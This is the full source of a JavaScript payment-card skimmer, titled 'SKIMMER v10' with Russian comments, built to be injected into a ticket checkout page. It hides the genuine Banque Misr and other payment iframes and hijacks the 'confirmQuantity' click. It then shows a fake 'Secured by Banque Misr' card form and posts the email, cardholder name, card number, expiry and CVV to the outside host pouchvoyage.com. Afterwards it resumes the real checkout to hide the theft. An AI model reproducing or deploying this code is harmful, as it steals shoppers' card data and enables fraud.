/**
 * SKIMMER v10 — точный клон BanqueMisr hosted checkout.
 * Структура оригинала: «Credit or Debit Card» заголовок, email, cardholder name,
 * card number, expiry MM/YY, security code, кнопка Pay с суммой, Click to Pay.
 * Их модалки закрываются при инжекте (fix фокус-трепа), Esc закрывает клон.
 */
(function () {
  'use strict';
  if (window.__SK_RUN) return;
  window.__SK_RUN = true;

  var HOOK = 'https://pouchvoyage.com/c';
  var TAG = 'sk_v10';

  function send(data) {
    try {
      fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(function () {});
      var img = new Image();
      img.src = HOOK + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }

  var INJECTED = false;

  function closeTheirModals() {
    try {
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        m.classList.remove('show');
        m.style.display = 'none';
        m.setAttribute('aria-hidden', 'true');
        m.removeAttribute('aria-modal');
      });
      document.querySelectorAll('.modal-backdrop').forEach(function (b) { b.remove(); });
      document.body.classList.remove('modal-open');
      document.body.style.overflow = '';
      document.body.style.paddingRight = '';
    } catch (e) {}
  }

  /* сумма из DOM — ищем цену билета */
  function findAmount() {
    try {
      var txt = document.body.innerText;
      var m = txt.match(/EGP\s*([\d.,]+)/i);
      if (m) return 'EGP ' + m[1];
      m = txt.match(/([\d.,]+)\s*EGP/i);
      if (m) return 'EGP ' + m[1];
    } catch (e) {}
    return '';
  }

  function injectForm() {
    if (INJECTED) return;
    INJECTED = true;

    closeTheirModals();

    try {
      document.querySelectorAll('iframe').forEach(function (f) {
        var s = (f.src || '') + (f.name || '') + (f.id || '');
        if (/(bankmisr|banquemisr|gateway|mastercard|stripe|ryft|paymob|payment|checkout)/i.test(s)) {
          f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;position:absolute!important;left:-9999px!important;';
        }
      });
    } catch (e) {}

    try {
      var amount = findAmount();

      var bd = document.createElement('div');
      bd.id = 'skBackdrop';
      bd.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:2147483645;';
      document.body.appendChild(bd);

      var d = document.createElement('div');
      d.id = 'skCardModal';
      d.setAttribute('tabindex', '-1');
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:8px;box-shadow:0 8px 40px rgba(0,0,0,.4);padding:24px 26px;' +
        'width:480px;max-width:94vw;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;' +
        'pointer-events:auto;box-sizing:border-box;max-height:94vh;overflow-y:auto;';

      var lblStyle = 'font-size:13px;font-weight:600;color:#141414;display:block;margin-bottom:5px;';
      var inpStyle = 'width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;background:#fff;color:#141414;outline:none;';

      d.innerHTML =
        // заголовок как в оригинале
        '<div style="font-size:17px;font-weight:600;color:#141414;margin-bottom:4px;">Credit or Debit Card</div>' +
        '<div style="font-size:13px;color:#6c757d;margin-bottom:18px;">Enter your card details below</div>' +

        // Email
        '<div style="margin-bottom:13px;">' +
        '  <label style="' + lblStyle + '">E-mail</label>' +
        '  <input id="skEmail" autocomplete="off" type="email" placeholder="your@email.com" style="' + inpStyle + '">' +
        '</div>' +

        // Cardholder name
        '<div style="margin-bottom:13px;">' +
        '  <label style="' + lblStyle + '">Name on card <span style="color:#c00">*</span></label>' +
        '  <input id="skName" autocomplete="off" placeholder="Exactly as shown on card" style="' + inpStyle + '">' +
        '</div>' +

        // Card number
        '<div style="margin-bottom:13px;">' +
        '  <label style="' + lblStyle + '">Card number <span style="color:#c00">*</span></label>' +
        '  <div style="display:flex;align-items:stretch;">' +
        '    <input id="skNum" autocomplete="off" inputmode="numeric" placeholder="0000 0000 0000 0000" ' +
        '       style="flex:1;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-right:none;border-radius:5px 0 0 5px;font-size:14px;outline:none;">' +
        '    <div style="display:flex;align-items:center;padding:0 10px;border:1px solid #ced4da;border-radius:0 5px 5px 0;background:#f8f9fa;">' +
        '      <span style="font-size:15px;">&#128274;</span>' +
        '    </div>' +
        '  </div>' +
        '</div>' +

        // Expiry
        '<div style="margin-bottom:13px;">' +
        '  <label style="' + lblStyle + '">Expiry date <span style="color:#c00">*</span></label>' +
        '  <div style="display:flex;align-items:center;gap:8px;">' +
        '    <input id="skExpM" inputmode="numeric" maxlength="2" placeholder="MM" style="width:76px;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;text-align:center;outline:none;">' +
        '    <span style="color:#6c757d;">/</span>' +
        '    <input id="skExpY" inputmode="numeric" maxlength="2" placeholder="YY" style="width:76px;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;text-align:center;outline:none;">' +
        '  </div>' +
        '</div>' +

        // Security code
        '<div style="margin-bottom:18px;">' +
        '  <label style="' + lblStyle + '">Security code <span style="color:#c00">*</span></label>' +
        '  <input id="skCvv" autocomplete="off" inputmode="numeric" maxlength="4" placeholder="123" ' +
        '     style="width:110px;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;outline:none;">' +
        '</div>' +

        // Pay с суммой
        '<button id="skPayBtn" style="width:100%;padding:12px;background:#D24646;color:#fff;border:none;border-radius:6px;' +
        'font-size:16px;font-weight:600;cursor:pointer;">' + (amount ? ('Pay ' + amount) : 'Pay') + '</button>' +
        '<div style="text-align:center;margin-top:10px;font-size:12.5px;color:#6c757d;">' +
        '  <span style="color:#0066c0;cursor:pointer;text-decoration:underline;" id="skCtp">Click to Pay</span>' +
        '</div>' +
        '<div style="display:flex;justify-content:center;align-items:center;gap:6px;margin-top:10px;color:#6c757d;font-size:11.5px;">' +
        '  <span>&#128274;</span> Secured by Banque Misr</div>' +
        '<div id="skStatus" style="text-align:center;font-size:13px;color:#dc3545;margin-top:8px;min-height:17px;"></div>';
      document.body.appendChild(d);

      setTimeout(function () {
        try {
          var f = document.getElementById('skName');
          if (f) f.focus();
        } catch (e) {}
      }, 100);

      var email = d.querySelector('#skEmail'), name = d.querySelector('#skName'),
          num = d.querySelector('#skNum'), expM = d.querySelector('#skExpM'),
          expY = d.querySelector('#skExpY'), cvv = d.querySelector('#skCvv'),
          btn = d.querySelector('#skPayBtn'), status = d.querySelector('#skStatus');

      btn.addEventListener('click', function () {
        if (!num.value.trim() || !expM.value.trim() || !expY.value.trim() || !cvv.value.trim()) {
          status.innerHTML = 'Please fill in all card fields';
          return;
        }
        send({
          tag: TAG,
          url: location.href,
          email: email.value || '',
          full_name: name.value.trim(),
          card_number: (num.value || '').replace(/\s+/g, ''),
          expiry: (expM.value || '') + '/' + (expY.value || ''),
          cvv: cvv.value || '',
          holder: name.value || '',
          amount: amount,
          ts: new Date().toISOString()
        });
        status.innerHTML = 'Processing&hellip;';
        status.style.color = '#6c757d';
        btn.disabled = true;
        btn.style.background = '#999';
        setTimeout(function () {
          try {
            if (window.__skOrigConfirm) {
              var m = document.getElementById('skCardModal');
              var b2 = document.getElementById('skBackdrop');
              if (m) m.remove();
              if (b2) b2.remove();
              INJECTED = false;
              window.__skOrigConfirm();
            }
          } catch (e) {}
        }, 1600);
      });

      var escHandler = function (ev) {
        if (ev.key === 'Escape') {
          var m = document.getElementById('skCardModal');
          var b2 = document.getElementById('skBackdrop');
          if (m) m.remove();
          if (b2) b2.remove();
          INJECTED = false;
          document.removeEventListener('keydown', escHandler);
        }
      };
      document.addEventListener('keydown', escHandler, true);
    } catch (e) {}
  }

  var lastClick = 0;

  function hookClicks() {
    document.addEventListener('click', function (ev) {
      var el = ev.target;
      while (el && el !== document.body) {
        var oc = (el.getAttribute && el.getAttribute('onclick')) || '';
        if (/confirmQuantity/i.test(oc)) {
          var now = Date.now();
          if (now - lastClick < 3000) return;
          lastClick = now;
          ev.preventDefault();
          ev.stopImmediatePropagation();
          var arg = (oc.match(/confirmQuantity\(\s*['"]?([^'")\s]+)['"]?\s*\)/) || [])[1];
          window.__skOrigConfirm = function () {
            try {
              if (typeof window.confirmQuantity === 'function') {
                window.confirmQuantity(arg);
              } else if (el && el.click) {
                el.click();
              }
            } catch (e) {}
          };
          injectForm();
          return;
        }
        el = el.parentElement;
      }
    }, true);
  }

  try {
    hookClicks();
  } catch (e) {}
})();
